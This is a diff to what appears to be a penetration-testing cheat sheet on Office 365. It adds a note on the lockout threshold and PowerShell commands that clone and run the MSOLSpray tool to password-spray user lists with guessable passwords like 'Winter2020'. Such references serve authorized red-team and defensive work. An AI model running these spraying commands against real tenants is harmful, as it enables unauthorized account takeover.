@@ -32,7 +32,6 @@
     ```
 
 
-
 ### Enumerate Email
 
 > By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.
@@ -50,9 +49,14 @@
 
 ### Password Spraying
 
+The default lockout policy tolerates 10 failed attempts, then lock out an account for 60 seconds.
+
 ```powershell
+PS> git clone https://github.com/dafthack/MSOLSpray
 PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
 PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
+PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
+PS> Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
 ```
 
 
